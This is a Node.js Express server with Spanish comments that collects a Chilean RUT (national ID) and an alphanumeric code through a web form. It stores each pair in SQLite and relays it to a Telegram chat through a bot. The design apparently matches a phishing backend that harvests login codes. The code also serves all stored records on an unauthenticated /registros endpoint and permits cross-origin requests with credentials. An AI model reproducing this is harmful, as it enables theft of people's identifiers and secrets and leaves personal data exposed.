const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const dbPath = path.join(__dirname, 'datos.db');

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || process.env.TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID || '';

app.use(cors({ origin: true, credentials: true }));
app.options('*', cors({ origin: true, credentials: true }));
app.use(express.json());
app.use(express.static(__dirname));

const db = new sqlite3.Database(dbPath, (err) => {
  if (err) {
    console.error('Error al abrir la base de datos:', err.message);
  } else {
    console.log('Conectado a SQLite.');
  }
});

db.run(`
  CREATE TABLE IF NOT EXISTS ingresos (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    numero TEXT NOT NULL,
    alfanumerico TEXT NOT NULL,
    fecha_creacion DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

function validarRut(rut) {
  const clean = String(rut || '')
    .replace(/\./g, '')
    .replace('-', '')
    .toUpperCase();

  if (!/^[0-9]{7,8}[0-9K]$/.test(clean)) return false;

  const cuerpo = clean.slice(0, -1);
  const dv = clean.slice(-1);

  let suma = 0;
  let multiplo = 2;

  for (let i = cuerpo.length - 1; i >= 0; i--) {
    suma += Number(cuerpo[i]) * multiplo;
    multiplo = multiplo === 7 ? 2 : multiplo + 1;
  }

  const resto = 11 - (suma % 11);
  const dvEsperado = resto === 11 ? '0' : resto === 10 ? 'K' : String(resto);

  return dv === dvEsperado;
}

async function enviarNotificacionTelegram({ numero, alfanumerico, id }) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('Telegram no configurado. Se omite la notificación.');
    return;
  }

  const texto = `📥 Nuevo ingreso\n🆔 Registro: ${id}\n🔢 RUT: ${numero}\n🔤 Alfanumérico: ${alfanumerico}`;

  const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: texto,
      parse_mode: 'HTML'
    })
  });

  const data = await response.json().catch(() => ({}));

  if (!response.ok || !data.ok) {
    throw new Error(data.description || 'Error al enviar la notificación a Telegram');
  }

  console.log('Notificación enviada a Telegram correctamente.');
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok' });
});

app.post('/guardar', async (req, res) => {
  const numero = String(req.body.numero || '').trim();
  const alfanumerico = String(req.body.alfanumerico || '').trim();

  if (!validarRut(numero)) {
    return res.status(400).json({ error: 'El RUT ingresado no es válido' });
  }

  if (!alfanumerico || !/^[A-Za-z0-9]+$/.test(alfanumerico)) {
    return res.status(400).json({ error: 'El campo alfanumérico solo admite letras y números' });
  }

  const sql = 'INSERT INTO ingresos (numero, alfanumerico) VALUES (?, ?)';

  db.run(sql, [numero, alfanumerico], async function (err) {
    if (err) {
      console.error('Error al guardar:', err.message);
      return res.status(500).json({ error: 'Error al guardar en la base de datos' });
    }

    const registroId = this.lastID;

    try {
      await enviarNotificacionTelegram({ numero, alfanumerico, id: registroId });
    } catch (telegramError) {
      console.error('Error al notificar Telegram:', telegramError.message);
    }

    return res.status(201).json({
      mensaje: 'Hemos recibido su solicitud correctamente',
      id: registroId
    });
  });
});

app.get('/registros', (req, res) => {
  db.all('SELECT * FROM ingresos ORDER BY id DESC', [], (err, rows) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    return res.json(rows);
  });
});

app.listen(PORT, () => {
  console.log(`Servidor corriendo en puerto ${PORT}`);
});
